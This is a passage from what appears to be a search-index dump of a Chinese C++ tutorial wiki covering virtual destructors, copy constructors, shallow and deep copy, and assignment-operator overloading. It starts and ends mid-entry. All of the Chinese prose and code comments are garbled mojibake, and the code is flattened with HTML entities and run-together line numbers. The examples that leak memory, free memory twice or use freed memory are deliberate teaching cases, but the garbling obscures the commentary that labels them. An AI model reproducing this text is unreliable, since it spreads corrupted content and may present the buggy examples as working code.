: public Base&#123;private: int y;public: Derived() &#123; y = 2; printf(&quot;Derived() called &quot;); &#125; ~Derived() &#123; printf(&quot;~Derived() called &quot;); &#125;&#125;;int main()&#123; Base* p = new Derived(); // çˆ¶ç±»æŒ‡é’ˆæŒ‡å‘å­ç±»å¯¹è±¡ delete p; // ææ„å‡½æ•°ä¼šå¤šæ€ return 0;&#125; ææ„æ—¶æ­£ç¡®äº†ï¼Œçœ‹åæ±‡ç¼–å’Œéææ„å‡½æ•°çš„åŒºåˆ«ã€‚ çœ‹åˆ°deleteæ—¶callå˜æˆäº†é—´æ¥è°ƒç”¨è™šè¡¨ï¼Œ[ebp-1Ch]æ˜¯newè¿”å›çš„å †çš„å†…å­˜åœ°å€ï¼Œç„¶åå¾—åˆ°vptrï¼ˆmov edx,dword ptr [ecx]ï¼‰ï¼Œç„¶åå»è™šè¡¨è°ƒç”¨è™šå‡½æ•°åœ°å€ï¼ˆcall dword ptr [edx]ï¼‰ï¼Œåœ¨ä¸‹æ–¹çš„å˜é‡ç›‘è§†çª—å£çœ‹åˆ°è™šè¡¨ä¸­æ˜¯Derived::~scalar deleting destructor æ„é€ å‡½æ•°å’Œææ„å‡½æ•°æ˜¯ç¼–è¯‘å™¨åœ¨ç¼–è¯‘æ—¶å¸®æˆ‘ä»¬æ’å…¥ç”Ÿæˆçš„ï¼Œå…¶å®å®ƒä»¬ä¹Ÿæ˜¯ä¸ªå‡½æ•°ã€‚ä½¿ç”¨çˆ¶ç±»æŒ‡é’ˆæŒ‡å‘å­ç±»å¯¹è±¡æ—¶ï¼Œå¦‚æœçˆ¶ç±»ææ„å‡½æ•°ä¸æ˜¯è™šå‡½æ•°ï¼Œé‚£ä¹ˆdelete pæ—¶ï¼Œç¼–è¯‘å™¨åªçŸ¥é“è°ƒç”¨Baseç±»çš„ææ„å‡½æ•°ã€‚è€Œå°†Baseç±»ä¸­çš„ææ„å‡½æ•°å†™æˆè™šææ„å‡½æ•°æ—¶ï¼Œdelete pä¼šå‘ç”Ÿå¤šæ€ï¼Œæ ¹æ®å…·ä½“çš„å¯¹è±¡ï¼Œæ¥è°ƒç”¨é‚£ä¸ªå¯¹è±¡çš„ææ„å‡½æ•°ï¼ˆSound familiar? This is the same problem that virtual functions were created to solve for the general case. Fortunately, virtual functions work for destructors as they do for all other functions except constructors. ï¼‰ å°ç»“ å†™ä¸€ä¸ªç±»æ—¶ï¼Œå°†ææ„å‡½æ•°å†™æˆè™šå‡½æ•°æ˜¯ä¸€ä¸ªå¥½çš„åšæ³•ã€‚å› ä¸ºä½ å¹¶ä¸çŸ¥é“å…¶ä»–äººåœ¨ä½¿ç”¨è¿™ä¸ªä»£ç æ—¶ä¼šä¸ä¼šç»§æ‰¿è¿™ä¸ªç±»ï¼Œç„¶åç”¨åŸºç±»ç±»å‹çš„æŒ‡é’ˆå»deleteä¸€ä¸ªæ´¾ç”Ÿç±»å®ä¾‹ã€‚ æ˜¯ä¸€ä¸ªå¥½çš„åšæ³•ï¼Œå°¤å…¶æ˜¯åœ¨æ¶‰åŠç»§æ‰¿æ—¶ï¼Œå› ä¸ºå®ƒç¡®ä¿äº†å½“é€šè¿‡åŸºç±»æŒ‡é’ˆåˆ é™¤æ´¾ç”Ÿç±»å¯¹è±¡æ—¶ï¼Œé€‚å½“çš„ææ„å‡½æ•°è¢«è°ƒç”¨ å¼€å‘ä¸­å¿½ç•¥äº†å°†çˆ¶ç±»ææ„å‡½æ•°å£°æ˜ä¸ºè™šææ„å‡½æ•°çš„ä¾‹å­ å’”å’”å†™äº†ä½¿ç”¨å¤šæ€çš„ä»£ç ï¼ˆarr[i]-&gt;Print();ï¼‰ï¼Œç”¨äº†newçš„æ–¹å¼ï¼Œç”¨äº†upcastingï¼ˆçˆ¶ç±»æŒ‡é’ˆæŒ‡å‘å­ç±»å¯¹è±¡ï¼‰ï¼Œæœ€ådeleteæ—¶ä¼šæœ‰éšè—çš„é™·é˜±ï¼ˆåªé‡Šæ”¾äº†çˆ¶ç±»çš„å¯¹è±¡å†…å®¹ï¼‰ 1234567891011121314void TestBound() &#123; Base* arr[] = &#123;new Base(), new Sub1(), new Sub2()&#125;; // ä½¿ç”¨ new åˆ›å»ºå¯¹è±¡ for (int i = 0; i &lt; 3; i++) &#123; arr[i]-&gt;Print(); //å¤šæ€ &#125; for (int i = 0; i &lt; 3; i++) &#123; delete arr[i]; // åˆ é™¤å¯¹è±¡æ—¶æ²¡å¤šæ€ï¼Œåªè°ƒç”¨çˆ¶ç±»çš„ææ„å‡½æ•° &#125;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#include &lt;stdio.h&gt;class Base &#123;public: int a; Base() &#123; a = 1; printf(&quot;Base() called. Set a = 1 &quot;); &#125; ~Base() &#123; printf(&quot;Base destructor called &quot;); &#125; virtual void Print() &#123; printf(&quot;Base::Print() called: a=%d &quot;, a); &#125;&#125;;class Sub1 : public Base &#123;public: int x; Sub1() &#123; a = 2; x = 10; printf(&quot;Sub1() called. Set a=2 and x=10 &quot;); &#125; ~Sub1() &#123; printf(&quot;Sub1 destructor called &quot;); &#125; void Print() &#123; printf(&quot;Sub1::Print() called: a=%d, x=%d &quot;, a, x); &#125;&#125;;class Sub2 : public Base &#123;public: int y; Sub2() &#123; a = 3; y = 20; printf(&quot;Sub2() called. Set a=3 and y=20 &quot;); &#125; ~Sub2() &#123; printf(&quot;Sub2 destructor called &quot;); &#125; void Print() &#123; printf(&quot;Sub2::Print() called: a=%d, y=%d &quot;, a, y); &#125;&#125;;void TestBound() &#123; Base* arr[] = &#123;new Base(), new Sub1(), new Sub2()&#125;; // ä½¿ç”¨ new åˆ›å»ºå¯¹è±¡ for (int i = 0; i &lt; 3; i++) &#123; arr[i]-&gt;Print(); //å¤šæ€ &#125; for (int i = 0; i &lt; 3; i++) &#123; delete arr[i]; // åˆ é™¤å¯¹è±¡æ—¶æ²¡å¤šæ€ï¼Œåªè°ƒç”¨çˆ¶ç±»çš„ææ„å‡½æ•° &#125;&#125;int main() &#123; TestBound(); return 0;&#125;"},{"title":"å¯¹è±¡æ‹·è´-æ‹·è´æ„é€ å‡½æ•°","path":"/wiki/C++/å¯¹è±¡æ‹·è´-æ‹·è´æ„é€ å‡½æ•°.html","content":"å‰è¨€ å¯¹è±¡æ‹·è´æŒ‡çš„æ˜¯åˆ›å»ºä¸€ä¸ªæ–°å¯¹è±¡ï¼Œä½¿å…¶æˆä¸ºæŸä¸ªå·²å­˜åœ¨å¯¹è±¡çš„å‰¯æœ¬ã€‚æœ‰ä¸¤ç§æ–¹å¼æ¥å®ç°å¯¹è±¡æ‹·è´ï¼šæ‹·è´æ„é€ å‡½æ•°ï¼ˆCopy Constructorï¼‰ï¼Œå’Œï¼Œé‡è½½èµ‹å€¼è¿ç®—ç¬¦(=)ã€‚æœ¬å°èŠ‚è®²è§£æ‹·è´æ„é€ å‡½æ•°ã€‚ è¯­æ³•å½¢å¼ å‡½æ•°å£°æ˜æ˜¯å›ºå®šçš„ï¼Œå¦‚ä¸‹ 1ClassName(const ClassName&amp; other); ClassNameæ˜¯ç±»åï¼Œother æ˜¯å¦ä¸€ä¸ªåŒç±»å‹çš„å¯¹è±¡çš„å¼•ç”¨ ä¾‹ ç¼–è¯‘å™¨ä¼šè‡ªåŠ¨ä¸ºä¸€ä¸ªç±»ç”Ÿæˆæ‹·è´æ„é€ å‡½æ•°ï¼Œå³é»˜è®¤æ‹·è´æ„é€ å‡½æ•°ï¼ˆdefault copy constructorï¼‰æ›¿å¼€å‘è€…å†™å¥½äº†å¯¹è±¡æ‹·è´çš„ä»£ç ã€‚ ç®€å•å¯¹è±¡-æ‹·è´æ„é€ å‡½æ•°æœ‰çˆ¶ç±»çš„å¯¹è±¡-æ‹·è´æ„é€ å‡½æ•°æ‰§è¡Œåï¼Œb2ã€b3æ˜¯b1å¯¹è±¡çš„æ‹·è´ã€‚ 1234567891011121314151617181920212223class Base&#123;private: int x;public: Base(int x) : x(x) &#123;&#125;&#125;;int main()&#123; Base b1(1); // Base parameterized constructor called here Base b2 = b1; // åœ¨æ ˆä¸­çš„å¯¹è±¡ // Base copy constructor called here Base *b3 = new Base(b1); // åœ¨å †ä¸­çš„å¯¹è±¡ // Base copy constructor called here // ... ä½¿ç”¨ b2 å’Œ b3 ... // æ³¨æ„ï¼šåˆ›å»ºåœ¨å †ä¸Šçš„å¯¹è±¡éœ€è¦æ‰‹åŠ¨åˆ é™¤ delete b3;&#125; æ‹·è´æ„é€ å‡½æ•°æ˜¯å¯¹æ•´ä¸ªå¯¹è±¡çš„å¤åˆ¶ï¼ŒåŒ…æ‹¬ä»çˆ¶ç±»ç»§æ‰¿ä¸‹æ¥çš„æˆå‘˜ã€‚ 1234567891011121314151617181920212223242526272829303132class Base&#123;private: int x;public: Base(int x) : x(x) &#123;&#125;&#125;;class Derived : public Base&#123;private: int y;public: Derived(int x, int y) : Base(x), y(y) &#123;&#125;&#125;;int main()&#123; Derived d1(1, 2); // Derived parameterized constructor called here Derived d2 = d1; // åœ¨æ ˆä¸­çš„å¯¹è±¡ // Derived copy constructor called here Derived *d3 = new Derived(d1); // åœ¨å †ä¸­çš„å¯¹è±¡ // Derived copy constructor called here // ... ä½¿ç”¨ d2 å’Œ d3 ... // æ³¨æ„ï¼šåˆ›å»ºåœ¨å †ä¸Šçš„å¯¹è±¡éœ€è¦æ‰‹åŠ¨åˆ é™¤ delete d3;&#125; æµ…æ‹·è´å’Œæ·±æ‹·è´ é€šå¸¸æƒ…å†µä¸‹ç¼–è¯‘å™¨æ›¿æˆ‘ä»¬ç”Ÿæˆçš„é»˜è®¤æ‹·è´æ„é€ å‡½æ•°ï¼ˆdefault copy constructorï¼‰å°±èƒ½å‡ºè‰²åœ°å®Œæˆå¯¹è±¡çš„æ‹·è´å·¥ä½œäº†ï¼Œä½†é»˜è®¤æ‹·è´æ„é€ å‡½æ•°ï¼ˆdefault copy constructorï¼‰æ˜¯æœ‰ç¼ºç‚¹çš„ï¼Œå®ƒæ˜¯æµ…æ‹·è´ï¼ˆShallow Copyï¼‰ã€‚ å½“ç±»ä¸­å«æœ‰æŒ‡é’ˆæˆå‘˜æ—¶ï¼Œæµ…æ‹·è´æ„å‘³ç€åªå¤åˆ¶æŒ‡é’ˆçš„å€¼ï¼Œè€Œä¸å¤åˆ¶æŒ‡é’ˆæ‰€æŒ‡å‘çš„æ•°æ®ã€‚è¿™å¯èƒ½å¯¼è‡´ä¸¤ä¸ªå¯¹è±¡çš„æŒ‡é’ˆæˆå‘˜éƒ½æŒ‡å‘åŒä¸€ä¸ªå†…å­˜åœ°å€ï¼Œä»è€Œå¼•å‘é—®é¢˜ï¼Œå¦‚æœä¸€ä¸ªå¯¹è±¡è¢«é”€æ¯å¹¶é‡Šæ”¾äº†å…¶æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ï¼Œå¦ä¸€ä¸ªå¯¹è±¡è¿˜æŒæœ‰åŒä¸€ä¸ªåœ°å€çš„æŒ‡é’ˆï¼Œè¿™ä¼šå¯¼è‡´æ‚¬æŒ‚æŒ‡é’ˆæˆ–åŒé‡åˆ é™¤ç­‰é—®é¢˜ã€‚ ä¾‹ 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;cstring&gt;#include &lt;cstdio&gt; // åŒ…å«ç”¨äº printfclass String &#123;public: char* str; // æŒ‡é’ˆæˆå‘˜ int length; // åŸºæœ¬æ•°æ®ç±»å‹æˆå‘˜ // æ„é€ å‡½æ•° String(const char* str) &#123; this-&gt;length = strlen(str); this-&gt;str = new char[this-&gt;length + 1]; //æŒ‡é’ˆæˆå‘˜æŒ‡å‘äº†ç”³è¯·çš„å†…å­˜ strcpy(this-&gt;str, str); &#125; // é»˜è®¤çš„æ‹·è´æ„é€ å‡½æ•°æ˜¯æµ…æ‹·è´ // ææ„å‡½æ•° ~String() &#123; delete[] str; //ææ„ä¸­é‡Šæ”¾ç”³è¯·çš„å†…å­˜ printf(&quot;String destroyed. &quot;); &#125;&#125;;void printString(String s) &#123; printf(&quot;String: %s, Length: %d &quot;, s.str, s.length); &#125;int main() &#123; String s1(&quot;hello&quot;); &#123; String s2 = s1; // ä½¿ç”¨é»˜è®¤çš„æ‹·è´æ„é€ å‡½æ•° printString(s2); &#125; // s2 åœ¨è¿™é‡Œè¢«é”€æ¯ // æ­¤æ—¶ï¼Œs1.str æŒ‡å‘çš„å†…å­˜å·²è¢«é‡Šæ”¾ï¼Œä½† s1 ä»ç„¶å°è¯•è®¿é—®å®ƒ printString(s1); // è¿™å¯èƒ½ä¼šå¯¼è‡´æœªå®šä¹‰è¡Œä¸ºï¼Œæ¯”å¦‚å´©æºƒ&#125; // s2 åœ¨è¿™é‡Œè¢«é”€æ¯ï¼Œå¯¹ä¸€å—å·²é‡Šæ”¾çš„å†…å­˜åˆdeleteä¸€æ¬¡ å¯ä»¥çœ‹åˆ°é»˜è®¤æ‹·è´æ„é€ å‡½æ•°åªæ˜¯å°†s1å¯¹è±¡çš„æˆå‘˜å˜é‡strå’Œlengthçš„å€¼æ‹·è´äº†ä¸€ä»½ï¼Œå¹¶æ²¡æœ‰å°†s1.stræŒ‡å‘çš„é‚£å—å†…å­˜çš„å†…å®¹ä¹Ÿæ‹·è´ä¸€ä»½ã€‚æµ…æ‹·è´å¯¼è‡´ç°åœ¨å‡ºç°äº†é—®é¢˜ï¼šs2.stræŒ‡å‘äº†åŒä¸€å—å†…å­˜ã€‚ å¦‚æœæˆ‘ä»¬æƒ³å®ç°å¯¹æŒ‡é’ˆæ‰€æŒ‡å‘æ•°æ®çš„å¤åˆ¶ï¼Œå³æ·±æ‹·è´ï¼ˆDeep Copyï¼‰ï¼Œå°±éœ€è¦è‡ªå·±å†™æ‹·è´æ„é€ å‡½æ•°ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;cstring&gt;#include &lt;cstdio&gt; // åŒ…å«ç”¨äº printfclass String &#123;public: char* str; // æŒ‡é’ˆæˆå‘˜ int length; // åŸºæœ¬æ•°æ®ç±»å‹æˆå‘˜ // æ„é€ å‡½æ•° String(const char* str) &#123; this-&gt;length = strlen(str); this-&gt;str = new char[this-&gt;length + 1]; //æŒ‡é’ˆæˆå‘˜æŒ‡å‘äº†ç”³è¯·çš„å†…å­˜ strcpy(this-&gt;str, str); &#125; // æ·±æ‹·è´çš„æ‹·è´æ„é€ å‡½æ•° String(const String&amp; other) &#123; length = other.length; str = new char[length + 1]; //ç”³è¯·ä¸€å—æ–°çš„å†…å­˜ strcpy(str, other.str); //å°†otherå¯¹è±¡ä¸­é‚£å—å†…å­˜çš„å†…å®¹æ‹·è¿‡æ¥ &#125; // ææ„å‡½æ•° ~String() &#123; delete[] str; printf(&quot;String destroyed. &quot;); &#125;&#125;;void printString(const String&amp; s) &#123; printf(&quot;String: %s, Length: %d &quot;, s.str, s.length);&#125;int main() &#123; String s1(&quot;hello&quot;); &#123; String s2 = s1; // è°ƒç”¨æ·±æ‹·è´çš„æ‹·è´æ„é€ å‡½æ•° printString(s2); &#125; // s2 åœ¨è¿™é‡Œè¢«é”€æ¯ï¼Œä½†ä¸ä¼šå½±å“ s1 // s1 å®‰å…¨ä½¿ç”¨ printString(s1);&#125; s2.stræŒ‡å‘çš„æ˜¯æ–°çš„å†…å­˜åœ°å€ï¼Œä¸”é‚£å—å†…å­˜é‡Œçš„å†…å®¹ä¹Ÿå’Œs1ä¸€æ · å­ç±»æ‹·è´æ„é€ å‡½æ•°å†™æ³• åœ¨åˆå§‹åŒ–åˆ—è¡¨ä¸­è°ƒç”¨çˆ¶ç±»çš„æ‹·è´æ„é€ å‡½æ•° 12345// æ´¾ç”Ÿç±»çš„æ‹·è´æ„é€ å‡½æ•°Derived(const Derived&amp; other) : Base(other), derivedValue(other.derivedValue) &#123; printf(&quot;Derived copy constructor called &quot;);&#125; è°ƒç”¨Derivedæ‹·è´æ„é€ å‡½æ•°æ—¶ï¼Œä¼šå°†otherå¯¹è±¡äº¤ç»™Base&amp;ï¼ˆupcastingï¼Œæ´¾ç”Ÿç±»åˆ°åŸºç±»çš„éšå¼ç±»å‹è½¬æ¢ï¼Œæ¯ä¸ªDerivedå¯¹è±¡ä¹Ÿéƒ½æ˜¯ä¸€ä¸ªBaseå¯¹è±¡ï¼Œè¿™æ˜¯å®‰å…¨çš„ï¼‰ï¼Œç”±Baseçš„æ‹·è´æ„é€ å‡½æ•°å®Œæˆå¤„ç†å’Œå¤åˆ¶Baseéƒ¨åˆ†çš„æˆå‘˜ï¼Œæ´¾ç”Ÿç±»ç‰¹æœ‰çš„æˆå‘˜åˆ™ç”±æ´¾ç”Ÿç±»çš„æ‹·è´æ„é€ å‡½æ•°å¤„ç†ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;cstdio&gt;class Base &#123;public: int baseValue; // åŸºç±»çš„æ„é€ å‡½æ•° Base(int value) : baseValue(value) &#123;&#125; // åŸºç±»çš„æ‹·è´æ„é€ å‡½æ•° Base(const Base&amp; other) : baseValue(other.baseValue) &#123; printf(&quot;Base copy constructor called &quot;); &#125;&#125;;class Derived : public Base &#123;public: int derivedValue; // æ´¾ç”Ÿç±»çš„æ„é€ å‡½æ•° Derived(int baseValue, int derivedValue) : Base(baseValue), derivedValue(derivedValue) &#123;&#125; // æ´¾ç”Ÿç±»çš„æ‹·è´æ„é€ å‡½æ•° Derived(const Derived&amp; other) : Base(other), derivedValue(other.derivedValue) &#123; printf(&quot;Derived copy constructor called &quot;); &#125;&#125;;int main() &#123; Derived original(10, 20); Derived copy = original; // è¿™å°†è°ƒç”¨æ´¾ç”Ÿç±»çš„æ‹·è´æ„é€ å‡½æ•° printf(&quot;Original: baseValue = %d, derivedValue = %d &quot;, original.baseValue, original.derivedValue); printf(&quot;Copy: baseValue = %d, derivedValue = %d &quot;, copy.baseValue, copy.derivedValue); return 0;&#125; å°ç»“ å¦‚æœä¸éœ€è¦æ·±æ‹·è´ï¼Œä½¿ç”¨ç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆçš„é»˜è®¤æ‹·è´æ„é€ å‡½æ•°å³å¯ å¦‚æœç±»ä¸­å«æœ‰æŒ‡é’ˆæˆå‘˜ï¼Œé‚£å°±å¿…é¡»è¦è‡ªå·±å®ç°æ‹·è´æ„é€ å‡½æ•°ï¼Œå› ä¸ºé»˜è®¤æ‹·è´æ„é€ å‡½æ•°æ˜¯æµ…æ‹·è´ï¼Œæ— æ³•å»åšç”³è¯·ä¸€å—å†…å­˜è¿™ç§å¤æ‚åŠ¨ä½œ æ³¨ï¼šå¦‚æœè‡ªå·±æ·»åŠ äº†æ‹·è´æ„é€ å‡½æ•°ï¼Œæ‰€æœ‰æˆå‘˜çš„æ‹·è´å°±è¦è‡ªå·±æ¥å¤„ç†"},{"title":"å¯¹è±¡æ‹·è´-é‡è½½èµ‹å€¼è¿ç®—ç¬¦","path":"/wiki/C++/å¯¹è±¡æ‹·è´-é‡è½½èµ‹å€¼è¿ç®—ç¬¦.html","content":"å‰è¨€ å¯¹è±¡æ‹·è´æŒ‡çš„æ˜¯åˆ›å»ºä¸€ä¸ªæ–°å¯¹è±¡ï¼Œä½¿å…¶æˆä¸ºæŸä¸ªå·²å­˜åœ¨å¯¹è±¡çš„å‰¯æœ¬ã€‚æœ‰ä¸¤ç§æ–¹å¼æ¥å®ç°å¯¹è±¡æ‹·è´ï¼šæ‹·è´æ„é€ å‡½æ•°ï¼ˆCopy Constructorï¼‰ï¼Œå’Œï¼Œé‡è½½èµ‹å€¼è¿ç®—ç¬¦(=)ã€‚æœ¬å°èŠ‚è®²è§£é‡è½½èµ‹å€¼è¿ç®—ç¬¦(=)çš„æ–¹å¼å®Œæˆå¯¹è±¡æ‹·è´ã€‚ è¯­æ³•å½¢å¼ C++çš„èµ‹å€¼è¿ç®—ç¬¦å·=ï¼Œå·¦å³æ“ä½œæ•°æ˜¯æ”¯æŒå¯¹è±¡çš„ã€‚ ç®€å•å¯¹è±¡-æ‹·è´æ„é€ å‡½æ•°æœ‰çˆ¶ç±»çš„å¯¹è±¡-æ‹·è´æ„é€ å‡½æ•°æ‰§è¡Œåï¼Œb2ã€b3æ˜¯b1å¯¹è±¡çš„æ‹·è´ï¼Œxçš„å€¼éƒ½è¢«æ‹·è´æˆ1 123456789101112131415161718192021222324class Base&#123;private: int x;public: Base(int x) : x(x) &#123;&#125;&#125;;int main()&#123; Base b1(1); // Base parameterized constructor called here Base b2(2); b2 = b1; // ä½¿ç”¨èµ‹å€¼è¿ç®—ç¬¦æ¥æ‹·è´å¯¹è±¡ï¼ŒBase èµ‹å€¼è¿ç®—ç¬¦è¢«è°ƒç”¨ Base *b3 = new Base(3); // å…ˆåœ¨å †ä¸Šåˆ›å»ºä¸€ä¸ªå¯¹è±¡ *b3 = b1; // ç„¶åä½¿ç”¨èµ‹å€¼è¿ç®—ç¬¦ï¼ŒBase èµ‹å€¼è¿ç®—ç¬¦è¢«è°ƒç”¨ // ... ä½¿ç”¨ b2 å’Œ b3 ... // æ³¨æ„ï¼šåˆ›å»ºåœ¨å †ä¸Šçš„å¯¹è±¡éœ€è¦æ‰‹åŠ¨åˆ é™¤ delete b3;&#125; èµ‹å€¼è¿ç®—ç¬¦(=)ä¹Ÿæ˜¯å¯¹æ•´ä¸ªå¯¹è±¡çš„å¤åˆ¶ï¼ŒåŒ…æ‹¬ä»çˆ¶ç±»ç»§æ‰¿ä¸‹æ¥çš„æˆå‘˜ã€‚ 123456789101112131415161718192021222324252627282930313233class Base&#123;private: int x;public: Base(int x) : x(x) &#123;&#125;&#125;;class Derived : public Base&#123;private: int y;public: Derived(int x, int y) : Base(x), y(y) &#123;&#125;&#125;;int main()&#123; Derived d1(1, 1); // Derived parameterized constructor called here Derived d2(2, 2); d2 = d1; // ä½¿ç”¨èµ‹å€¼è¿ç®—ç¬¦æ¥æ‹·è´å¯¹è±¡ Derived *d3 = new Derived(3, 3); // åœ¨å †ä¸Šåˆ›å»ºçš„ä¸€ä¸ªå¯¹è±¡ *d3 = d1; // ä½¿ç”¨èµ‹å€¼è¿ç®—ç¬¦æ¥æ‹·è´å¯¹è±¡ // ... ä½¿ç”¨ d2 å’Œ d3 ... // æ³¨æ„ï¼šåˆ›å»ºåœ¨å †ä¸Šçš„å¯¹è±¡éœ€è¦æ‰‹åŠ¨åˆ é™¤ delete d3;&#125; èµ‹å€¼è¿ç®—ç¬¦çš„é—®é¢˜ èµ‹å€¼è¿ç®—ç¬¦(=)å’Œæ‹·è´æ„é€ å‡½æ•°ä¸€æ ·ï¼Œéƒ½æ˜¯å°†æˆå‘˜çš„å€¼ç›´æ¥èµ‹å€¼ï¼Œéƒ½æ˜¯â€œæµ…æ‹·è´â€ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;cstring&gt;#include &lt;cstdio&gt; // åŒ…å«ç”¨äº printfclass String &#123;public: char* str; // æŒ‡é’ˆæˆå‘˜ int length; // åŸºæœ¬æ•°æ®ç±»å‹æˆå‘˜ // æ„é€ å‡½æ•° String(const char* str) &#123; this-&gt;length = strlen(str); this-&gt;str = new char[this-&gt;length + 1]; //æŒ‡é’ˆæˆå‘˜æŒ‡å‘äº†ç”³è¯·çš„å†…å­˜ strcpy(this-&gt;str, str); &#125; // é»˜è®¤çš„èµ‹å€¼è¿ç®—ç¬¦æ˜¯æµ…æ‹·è´ // ææ„å‡½æ•° ~String() &#123; delete[] str; //ææ„ä¸­é‡Šæ”¾ç”³è¯·çš„å†…å­˜ printf(&quot;String destroyed. &quot;); &#125;&#125;;void printString(String s) &#123; printf(&quot;String: %s, Length: %d &quot;, s.str, s.length); &#125;int main() &#123; String s1(&quot;hello&quot;); String s2(&quot;temp&quot;); s2 = s1; // ä¼šä½¿ç”¨é»˜è®¤çš„èµ‹å€¼è¿ç®—ç¬¦ï¼ˆæµ…æ‹·è´ï¼‰ printString(s2); // æ‰“å° s2 // æ³¨æ„ï¼Œæ­¤æ—¶ s1 å’Œ s2 çš„ str æˆå‘˜æŒ‡å‘åŒä¸€å—å†…å­˜ // é€€å‡ºmainæ—¶ï¼Œs1å’Œs2ä¼šè¢«é”€æ¯ï¼Œå¯¹åŒä¸€å—å†…å­˜è¿›è¡Œä¸¤æ¬¡é‡Šæ”¾&#125; // s1 å’Œ s2 åœ¨è¿™é‡Œè¢«é”€æ¯ï¼Œå¯¹åŒä¸€å—å†…å­˜è¿›è¡Œä¸¤æ¬¡ delete å¯ä»¥çœ‹åˆ°é»˜è®¤çš„èµ‹å€¼è¿ç®—ç¬¦(=)å’Œé»˜è®¤æ‹·è´æ„é€ å‡½æ•°ä¸€æ ·ï¼Œä¹Ÿåªæ˜¯å°†s1å¯¹è±¡çš„æˆå‘˜å˜é‡strå’Œlengthçš„å€¼æ‹·è´äº†ä¸€ä»½ï¼Œå¹¶æ²¡æœ‰å°†s1.stræŒ‡å‘çš„é‚£å—å†…å­˜çš„å†…å®¹ä¹Ÿæ‹·è´ä¸€ä»½ã€‚æµ…æ‹·è´å¯¼è‡´ç°åœ¨å‡ºç°äº†é—®é¢˜ï¼šs2.stræŒ‡å‘äº†åŒä¸€å—å†…å­˜ã€‚ å¦‚æœæˆ‘ä»¬æƒ³å®ç°å¯¹æŒ‡é’ˆæ‰€æŒ‡å‘æ•°æ®çš„å¤åˆ¶ï¼Œå³æ·±æ‹·è´ï¼ˆDeep Copyï¼‰ï¼Œå°±éœ€è¦è‡ªå·±é‡è½½èµ‹å€¼è¿ç®—ç¬¦(=) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;cstring&gt;#include &lt;cstdio&gt; // åŒ…å«ç”¨äº printfclass String &#123;public: char* str; // æŒ‡é’ˆæˆå‘˜ int length; // åŸºæœ¬æ•°æ®ç±»å‹æˆå‘˜ // æ„é€ å‡½æ•° String(const char* str) &#123; this-&gt;length = strlen(str); this-&gt;str = new char[this-&gt;length + 1]; //æŒ‡é’ˆæˆå‘˜æŒ‡å‘äº†ç”³è¯·çš„å†…å­˜ strcpy(this-&gt;str, str); &#125; // æ·±æ‹·è´çš„èµ‹å€¼è¿ç®—ç¬¦é‡è½½ String&amp; operator=(const String&amp; other) &#123; if (this != &amp;other) // é˜²æ­¢è‡ªèµ‹å€¼ &#123; length = other.length; delete[] str; // åˆ é™¤ä¼ è¿›æ¥å¯¹è±¡åŸå…ˆå ç”¨çš„æ—§å†…å­˜ str = new char[length + 1]; strcpy(str, other.str); &#125; return *this; &#125; // ææ„å‡½æ•° ~String() &#123; delete[] str; //ææ„ä¸­é‡Šæ”¾ç”³è¯·çš„å†…å­˜ printf(&quot;String destroyed. &quot;); &#125;&#125;;void printString(String s) &#123; printf(&quot;String: %s, Length: %d &quot;, s.str, s.length); &#125;int main() &#123; String s1(&quot;hello&quot;); String s2(&quot;temp&quot;); s2 = s1; // ä½¿ç”¨èµ‹å€¼è¿ç®—ç¬¦è¿›è¡Œæ·±æ‹·è´ printString(s2); // æ‰“å° s2 // æ³¨æ„ï¼Œæ­¤æ—¶ s2 æŒ‡å‘çš„æ˜¯æ–°çš„å†…å­˜ &#125; // é€€å‡ºmainæ—¶ï¼Œs1å’Œs2ä¼šè¢«é”€æ¯ï¼Œå®ƒä»¬æŒ‡å‘çš„æ˜¯ä¸åŒçš„å†…å­˜ï¼Œæ‰€ä»¥å®‰å…¨ s2.stræŒ‡å‘çš„æ˜¯æ–°çš„å†…å­˜åœ°å€ï¼Œä¸”é‚£å—å†…å­˜é‡Œçš„å†…å®¹ä¹Ÿå’Œs1ä¸€æ · å­ç±»é‡è½½èµ‹å€¼è¿ç®—ç¬¦å†™æ³• åœ¨å­ç±»é‡è½½èµ‹å€¼è¿ç®—ç¬¦å‡½æ•°ä¸­æ˜¾å¼è°ƒç”¨çˆ¶ç±»çš„é‡è½½èµ‹å€¼è¿ç®—ç¬¦å‡½æ•° 12345678// æ´¾ç”Ÿç±»çš„èµ‹å€¼è¿ç®—ç¬¦é‡è½½Derived&amp; operator=(const Derived&amp; other) &#123; if (this != &amp;other) // é˜²æ­¢è‡ªèµ‹å€¼ &#123; Base::operator=(other); // æ˜¾å¼è°ƒç”¨åŸºç±»çš„èµ‹å€¼è¿ç®—ç¬¦ derivedValue = other.derivedValue; &#125; è°ƒç”¨Derivedèµ‹å€¼è¿ç®—ç¬¦å‡½æ•°æ—¶ï¼Œä¼šåœ¨å‡½æ•°ä¸­è°ƒç”¨Base::operator=(other);è®©çˆ¶ç±»å®Œæˆçˆ¶ç±»æˆå‘˜çš„æ‹·è´ï¼Œç„¶ååœ¨æ‰§è¡ŒDerived&amp; operator=(const Derived&amp; other) å‡½æ•°é‡Œå‰©ä¸‹çš„ä»£ç å®ŒæˆDerivedç±»è‡ªå·±ç‰¹æœ‰çš„æˆå‘˜ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;cstdio&gt;class Base &#123;public: int baseValue; // åŸºç±»çš„æ„é€ å‡½æ•° Base(int value) : baseValue(value) &#123;&#125; // åŸºç±»çš„èµ‹å€¼è¿ç®—ç¬¦é‡è½½ Base&amp; operator=(const Base&amp; other) &#123; if (this != &amp;other) // é˜²æ­¢è‡ªèµ‹å€¼ &#123; baseValue = other.baseValue; &#125; printf(&quot;Base assignment operator called &quot;); return *this; &#125;&#125;;class Derived : public Base &#123;public: int derivedValue; // æ´¾ç”Ÿç±»çš„æ„é€ å‡½æ•° Derived(int baseValue, int derivedValue) : Base(baseValue), derivedValue(derivedValue) &#123;&#125; // æ´¾ç”Ÿç±»çš„èµ‹å€¼è¿ç®—ç¬¦é‡è½½ Derived&amp; 